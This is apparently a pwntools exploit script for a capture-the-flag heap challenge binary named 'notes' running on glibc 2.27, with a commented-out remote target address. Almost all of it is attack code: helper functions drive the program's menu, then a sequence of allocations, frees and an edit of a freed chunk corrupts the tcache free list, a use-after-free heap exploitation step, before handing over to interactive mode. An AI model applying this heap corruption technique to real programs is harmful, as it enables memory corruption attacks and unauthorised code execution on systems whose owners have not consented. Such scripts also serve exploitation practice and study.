from pwn import *

ld = ELF("./ld-2.27.so")
elf = ELF("./notes")
libc = ELF("./libc-2.27.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#target = remote("40.71.72.198", 1235)

def sa(d):
    target.sendafter(">>", d)

def sla(d):
    sa( d+"\n")

def malloc(idx, sz, content="noob"):
    sla("1")
    sla(str(idx))
    sla(str(sz))
    if sz < 0x8f:
        sa(content)

def free(idx):
    sla("2")
    sla(str(idx))

def edit(idx, content):
    sla("3")
    sla(str(idx))
    sa(content)

def view(idx):
    sla("4")
    sla(str(idx))

context.log_level = "DEBUG"

malloc(0, 0x10, "A"*0x10)
malloc(1, 0x10, "A"*0x10)
malloc(2, 0x10, "A"*0x10)
malloc(3, 0x70, "\x00"*0x70)
free(0)
free(1)
edit(1, "\x90")

malloc(4, 0x10, "BLASSSS")
malloc(5, 0x10, "a"*8 + "\x01\x07a" + "\x00")

free(2)
#gdb.attach(target, 'heap bins')

target.interactive()